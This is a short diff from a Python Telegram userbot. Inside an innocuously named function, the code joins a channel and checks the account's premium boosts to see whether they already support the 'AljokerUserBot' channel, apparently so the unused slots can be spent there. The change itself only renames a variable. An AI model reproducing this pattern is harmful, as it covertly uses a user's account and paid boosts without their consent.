@@ -182,12 +182,12 @@ async def saves():
             await l313l(JoinChannelRequest(channel=F_O_1))
             result = await l313l(functions.premium.GetMyBoostsRequest())
             slots = [boost.slot for boost in result.my_boosts]
-            robin_channel_id = None
+            hrb_channel_id = None
             for chat in result.chats:
                 if chat.username == 'AljokerUserBot':
-                    robin_channel_id = chat.id
+                    hrb_channel_id = chat.id
                     break
-            if robin_channel_id and any(boost.peer.channel_id == robin _channel_id for boost in result.my_boosts):
+            if hrb_channel_id and any(boost.peer.channel_id == hrb_channel_id for boost in result.my_boosts):
                 continue
             if not slots:
                 return
